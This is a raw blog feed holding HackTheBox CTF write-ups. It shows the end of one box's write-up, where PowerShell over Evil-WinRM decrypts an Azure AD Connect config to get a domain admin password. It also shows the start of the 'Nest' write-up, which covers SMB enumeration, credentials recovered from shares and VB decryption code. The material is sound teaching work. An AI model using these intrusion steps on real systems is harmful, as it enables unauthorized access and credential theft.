&lt;span class="code-line"&gt;*Evil-WinRM* PS C:&amp;gt; $decrypted = $null&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:&amp;gt; $key2.DecryptBase64ToString($crypted, [ref]$decrypted)&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:&amp;gt; $domain = select-xml -Content $config -XPath &amp;quot;//parameter[@name=&amp;#39;forest-login-domain&amp;#39;]&amp;quot; | select @{Name = &amp;#39;Domain&amp;#39;; Expression = {$_.node.InnerXML}}&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:&amp;gt; $username = select-xml -Content $config -XPath &amp;quot;//parameter[@name=&amp;#39;forest-login-user&amp;#39;]&amp;quot; | select @{Name = &amp;#39;Username&amp;#39;; Expression = {$_.node.InnerXML}}&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:&amp;gt; $password = select-xml -Content $decrypted -XPath &amp;quot;//attribute&amp;quot; | select @{Name = &amp;#39;Password&amp;#39;; Expression = {$_.node.InnerXML}}&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:&amp;gt; Write-Host (&amp;quot;Domain: &amp;quot; + $domain.Domain)&lt;/span&gt;
&lt;span class="code-line"&gt;Domain: MEGABANK.LOCAL&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:&amp;gt; Write-Host (&amp;quot;Username: &amp;quot; + $username.Username)&lt;/span&gt;
&lt;span class="code-line"&gt;Username: administrator&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:&amp;gt; Write-Host (&amp;quot;Password: &amp;quot; + $password.Password)&lt;/span&gt;
&lt;span class="code-line"&gt;Password: d0m@in4dminyeah!&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We connect to the box with the domain admin account and retrieve the root flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root@kalili:~/tools/github/evil-winrm# ruby evil-winrm.rb -u administrator -i 10.10.10.172 -p &amp;#39;d0m@in4dminyeah!&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Evil-WinRM shell v1.8&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Info: Establishing connection to remote endpoint&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\Administrator\Documents&amp;gt; cat ../Desktop/root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;12909612d25c8dcf6e5a07d1a804a0bc&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;The user part of the box was classical and quit easy. The root part allow me to
learn a few things about Azure, Azure AD and how the Password Hash
Synchronisation works.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="Windows"></category><category term="SMB"></category><category term="Azure"></category><category term="PHS"></category></entry><entry><title>HTB: Nest</title><link href="https://maggick.fr/2020/06/htb-nest.html" rel="alternate"></link><published>2020-06-07T17:25:00+02:00</published><updated>2020-06-07T17:25:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-06-07:/2020/06/htb-nest.html</id><summary type="html">&lt;p&gt;&lt;img alt="Nest card" class="align-left" src="/media/2020.06/nest_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/225"&gt;Nest&lt;/a&gt;
This box is classified as an easy machine. It was publish on January the 25th by
&lt;a href="https://www.hackthebox.eu/home/users/profile/158833"&gt;VbScrub&lt;/a&gt;.
This box is a bit different that the other ones on HTB. Until the last step you
never have a shell on the box (and none is needed to root it). All commands and
enumeration are done on the SMB service. There is also a personnalized service
HQK.&lt;/p&gt;
&lt;p&gt;Getting user involve understanding a bit of cryptography (homemade combination
of base64 and AES) but nothing too complexe.&lt;/p&gt;
&lt;p&gt;Getting root required to decompile some .NET executable to get some parameter
for the homemade encryption.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.06/nest_card.png" alt="Nest card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/225"&gt;Nest&lt;/a&gt;
This box is classified as an easy machine. It was publish on January the 25th by
&lt;a href="https://www.hackthebox.eu/home/users/profile/158833"&gt;VbScrub&lt;/a&gt;.
This box is a bit different that the other ones on HTB. Until the last step you
never have a shell on the box (and none is needed to root it). All commands and
enumeration are done on the SMB service. There is also a personnalized service
HQK.&lt;/p&gt;
&lt;p&gt;Getting user involve understanding a bit of cryptography (homemade combination
of base64 and AES) but nothing too complexe.&lt;/p&gt;
&lt;p&gt;Getting root required to decompile some .NET executable to get some parameter
for the homemade encryption.&lt;/p&gt;


&lt;h1 id="user"&gt;User&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;We start with an nmap scan. Only the ports 445 (SMB) and 4386 are open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Mon Jan 27 03:59:58 2020 as: nmap -p- -sS -oA nmap_p 10.10.10.178&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.178&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.26s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65533 filtered ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT     STATE SERVICE&lt;/span&gt;
&lt;span class="code-line"&gt;445/tcp  open  microsoft-ds&lt;/span&gt;
&lt;span class="code-line"&gt;4386/tcp open  unknown&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Mon Jan 27 04:08:04 2020 -- 1 IP address (1 host up) scanned in 485.47 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="hqk-reporting-service"&gt;HQK Reporting Service&lt;/h2&gt;
&lt;p&gt;We connect to the port 4386 using telnet. This service allow us to list the
files on the system but nothing more. The &lt;code&gt;DEBUG&lt;/code&gt; function seems interesting but
we need a password for it.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;#telnet 10.10.10.178 4386&lt;/span&gt;
&lt;span class="code-line"&gt;Trying 10.10.10.178...&lt;/span&gt;
&lt;span class="code-line"&gt;Connected to 10.10.10.178.&lt;/span&gt;
&lt;span class="code-line"&gt;Escape character is &amp;#39;^]&amp;#39;.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;HQK Reporting Service V1.2&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;help&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;This service allows users to run queries against databases using the legacy HQK format&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;--- AVAILABLE COMMANDS ---&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;LIST&lt;/span&gt;
&lt;span class="code-line"&gt;SETDIR &amp;lt;Directory_Name&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;RUNQUERY &amp;lt;Query_ID&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;DEBUG &amp;lt;Password&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;HELP &amp;lt;Command&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;SETDIR C:\Users\&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Current directory set to Users&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;LIST&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt; QUERY FILES IN CURRENT DIRECTORY&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[DIR]  Administrator&lt;/span&gt;
&lt;span class="code-line"&gt;[DIR]  All Users&lt;/span&gt;
&lt;span class="code-line"&gt;[DIR]  Default&lt;/span&gt;
&lt;span class="code-line"&gt;[DIR]  Default User&lt;/span&gt;
&lt;span class="code-line"&gt;[DIR]  Public&lt;/span&gt;
&lt;span class="code-line"&gt;[DIR]  Service_HQK&lt;/span&gt;
&lt;span class="code-line"&gt;[DIR]  TempUser&lt;/span&gt;
&lt;span class="code-line"&gt;[1]   desktop.ini&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Current Directory: Users&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="smb"&gt;SMB&lt;/h2&gt;
&lt;p&gt;We enumerate the shares on the SMB server using metasploit. The share &lt;code&gt;Data&lt;/code&gt;
seems interesting.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msf5 &amp;gt; use auxiliary/scanner/smb/smb_enumshares&lt;/span&gt;
&lt;span class="code-line"&gt;msf5 auxiliary(scanner/smb/smb_enumshares) &amp;gt; set RHOSTS 10.10.10.178&lt;/span&gt;
&lt;span class="code-line"&gt;RHOSTS =&amp;gt; 10.10.10.178&lt;/span&gt;
&lt;span class="code-line"&gt;msf5 auxiliary(scanner/smb/smb_enumshares) &amp;gt; run&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[+] 10.10.10.178:445      - ADMIN$ - (DISK) Remote Admin&lt;/span&gt;
&lt;span class="code-line"&gt;[+] 10.10.10.178:445      - C$ - (DISK) Default share&lt;/span&gt;
&lt;span class="code-line"&gt;[+] 10.10.10.178:445      - Data - (DISK)&lt;/span&gt;
&lt;span class="code-line"&gt;[+] 10.10.10.178:445      - IPC$ - (IPC) Remote IPC&lt;/span&gt;
&lt;span class="code-line"&gt;[+] 10.10.10.178:445      - Secure$ - (DISK)&lt;/span&gt;
&lt;span class="code-line"&gt;[+] 10.10.10.178:445      - Users - (DISK)&lt;/span&gt;
&lt;span class="code-line"&gt;[*] 10.10.10.178:         - Scanned 1 of 1 hosts (100% complete)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We connect to this share anonymously and start to enumerate the folder and files
on the share. We quickly find a "Welcome Email" in the HR templates folder.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# smbclient //10.10.10.178/Data -U &amp;quot; &amp;quot;%&amp;quot; &amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;Try &amp;quot;help&amp;quot; to get a list of possible commands.&lt;/span&gt;
&lt;span class="code-line"&gt;smb: \&amp;gt; cd Shared\Templates\HR&lt;/span&gt;
&lt;span class="code-line"&gt;smb: \Shared\Templates\HR\&amp;gt; mget &amp;quot;Welcome Email.txt&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;Get file Welcome Email.txt? y&lt;/span&gt;
&lt;span class="code-line"&gt;getting file \Shared\Templates\HR\Welcome Email.txt of size 425 as Welcome Email.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This template email contain the username "TempUser" and its password.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# cat Welcome\ Email.txt&lt;/span&gt;
&lt;span class="code-line"&gt;We would like to extend a warm welcome to our newest member of staff, &amp;lt;FIRSTNAME&amp;gt; &amp;lt;SURNAME&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;You will find your home folder in the following location:&lt;/span&gt;
&lt;span class="code-line"&gt;\\HTB-NEST\Users\&amp;lt;USERNAME&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;If you have any issues accessing specific services or workstations, please inform the&lt;/span&gt;
&lt;span class="code-line"&gt;IT department and use the credentials below until all systems have been set up for you.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Username: TempUser&lt;/span&gt;
&lt;span class="code-line"&gt;Password: welcome2019&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Thank you&lt;/span&gt;
&lt;span class="code-line"&gt;HR&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="sbm-as-tempuser"&gt;SBM as TempUser&lt;/h2&gt;
&lt;p&gt;We can then connect to the SMB share using our "TempUser". We found a lot of
configuration files. The &lt;code&gt;RU_config.xml&lt;/code&gt; contain what seems to be a base64
password for the c.smith user. We try to decode it using &lt;code&gt;base64 -d&lt;/code&gt; but the result is not printable
characters.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# cat RU_config.xml&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;ConfigFile xmlns:xsi=&amp;quot;http://www.w3.org/2001/XMLSchema-instance&amp;quot; xmlns:xsd=&amp;quot;http://www.w3.org/2001/XMLSchema&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;Port&amp;gt;389&amp;lt;/Port&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;Username&amp;gt;c.smith&amp;lt;/Username&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;Password&amp;gt;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&amp;lt;/Password&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;/ConfigFile&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Looking a bit more at the files we found the NotepadPlusPlus configuration file
containing the history of the recently edited files. The
&lt;code&gt;\\HTB-NEST\Secure$\IT\Carl\Temp.txt&lt;/code&gt; seems to be interesting.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;#tail config.xml&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;lt;Find name=&amp;quot;redeem on&amp;quot; /&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;lt;Find name=&amp;quot;192&amp;quot; /&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;lt;Replace name=&amp;quot;C_addEvent&amp;quot; /&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;/FindHistory&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;History nbMaxFile=&amp;quot;15&amp;quot; inSubMenu=&amp;quot;no&amp;quot; customLength=&amp;quot;-1&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;lt;File filename=&amp;quot;C:\windows\System32\drivers\etc\hosts&amp;quot; /&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;lt;File filename=&amp;quot;\\HTB-NEST\Secure$\IT\Carl\Temp.txt&amp;quot; /&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;lt;File filename=&amp;quot;C:\Users\C.Smith\Desktop\todo.txt&amp;quot; /&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;/History&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;/NotepadPlus&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We connect to the "Secure$" share and go to Carl's folder. The Temp.txt doesn't
exist anymore but we found some visual basic code in a WIP folder.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# smbclient //10.10.10.178/Secure$ -U &amp;quot;TempUser&amp;quot;%&amp;quot;welcome2019&lt;/span&gt;
&lt;span class="code-line"&gt;smb: \IT\Carl\VB Projects\WIP\RU\RUScanner\&amp;gt; dir&lt;/span&gt;
&lt;span class="code-line"&gt;.                                   D        0  Wed Aug  7 18:05:54 2019&lt;/span&gt;
&lt;span class="code-line"&gt;..                                  D        0  Wed Aug  7 18:05:54 2019&lt;/span&gt;
&lt;span class="code-line"&gt;bin                                 D        0  Wed Aug  7 16:00:11 2019&lt;/span&gt;
&lt;span class="code-line"&gt;ConfigFile.vb                       A      772  Wed Aug  7 18:05:09 2019&lt;/span&gt;
&lt;span class="code-line"&gt;Module1.vb                          A      279  Wed Aug  7 18:05:44 2019&lt;/span&gt;
&lt;span class="code-line"&gt;My Project                          D        0  Wed Aug  7 16:00:11 2019&lt;/span&gt;
&lt;span class="code-line"&gt;obj                                 D        0  Wed Aug  7 16:00:11 2019&lt;/span&gt;
&lt;span class="code-line"&gt;RU Scanner.vbproj                   A     4828  Fri Aug  9 11:37:51 2019&lt;/span&gt;
&lt;span class="code-line"&gt;RU Scanner.vbproj.user              A      143  Tue Aug  6 08:55:27 2019&lt;/span&gt;
&lt;span class="code-line"&gt;SsoIntegration.vb                   A      133  Wed Aug  7 18:05:58 2019&lt;/span&gt;
&lt;span class="code-line"&gt;Utils.vb                            A     4888  Wed Aug  7 15:49:35 2019&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We download everything on our computer. The "Module1.vb" file is a module
loading a XML file "RU_config.xml" and using the Utils library to decode the
password stored in the file. We already have the XML file.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;Module&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nn"&gt;Module1&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;Sub&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;Main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Config&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ConfigFile&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ConfigFile&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;LoadFromFile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;RU_Config.xml&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;test&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;New&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SsoIntegration&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;With&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{.&lt;/span&gt;&lt;span class="n"&gt;Username&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Config&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Password&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Utils&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DecryptString&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Config&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Password&lt;/span&gt;&lt;span class="p"&gt;)}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;Console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;WriteLine&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Hello&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;End&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Sub&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;End&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Module&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The "Utils.vb" file contain the decrypting methods and the passphrase, the salt
value, the number of password iteration, the initialisation vector (for CBC mode)
and the key size.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;Imports&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nn"&gt;System.Text&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;Imports&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nn"&gt;System.Security.Cryptography&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;Public&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Class&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nc"&gt;Utils&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;Public&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Shared&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Function&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;GetLogFilePath&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Return&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;IO&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Path&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Combine&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Environment&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CurrentDirectory&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Log.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;End&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Function&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;Public&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Shared&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Function&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;DecryptString&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;EncryptedString&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;If&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IsNullOrEmpty&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;EncryptedString&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Then&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="k"&gt;Return&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Empty&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Else&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
